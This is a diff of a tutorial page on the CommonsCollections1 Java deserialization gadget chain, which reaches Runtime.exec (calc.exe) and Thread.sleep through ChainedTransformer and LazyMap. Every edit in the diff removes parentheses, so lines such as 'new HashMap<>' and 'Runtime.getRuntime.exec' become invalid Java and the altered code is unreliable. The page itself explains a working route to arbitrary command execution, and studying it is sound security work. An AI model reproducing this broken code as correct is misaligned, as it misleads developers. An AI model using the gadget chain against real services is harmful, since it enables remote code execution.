@@ -1,7 +1,7 @@
-# CommonsCollections1 Payload - Java Transformers to Runtime.exec() and Thread.sleep()
+# CommonsCollections1 Payload - Java Transformers to Runtime.exec and Thread.sleep
 
 
-## Java Transformers to Runtime.exec()
+## Java Transformers to Runtime.exec
 
 Java deserialization payloads commonly use transformers from Apache Commons Collections, as in the following example.<sup>[[1]](#references)</sup>
 
@@ -34,7 +34,7 @@ public class CommonsCollections1PayloadOnly {
                 ) //(4)
         };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-        Map map = new HashMap<>();
+        Map map = new HashMap<>;
         Map lazyMap = LazyMap.decorate(map, chainedTransformer);
 
         //Execute gadgets
@@ -49,7 +49,7 @@ First of all you need to know that a **Transformer in Java** is something that *
 Also it's interesting to know that the **payload** being **executed** here is **equivalent** to:
 
 ```java
-Runtime.getRuntime().exec(new String[]{"calc.exe"});
+Runtime.getRuntime.exec(new String[]{"calc.exe"});
 ```
 
 Or **more exactly**, what is going to be executed at the end would be:
@@ -96,7 +96,7 @@ Chaining the transformations in this array produces the final arbitrary-command 
 So, **how are those transforms chained?**
 
 ```java
-Map map = new HashMap<>();
+Map map = new HashMap<>;
 Map lazyMap = LazyMap.decorate(map, chainedTransformer);
 lazyMap.get("anything");
 ```
@@ -211,7 +211,7 @@ public class CommonsCollections1Sleep {
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-        Map map = new HashMap<>();
+        Map map = new HashMap<>;
         Map lazyMap = LazyMap.decorate(map, chainedTransformer);
 
         //Execute gadgets
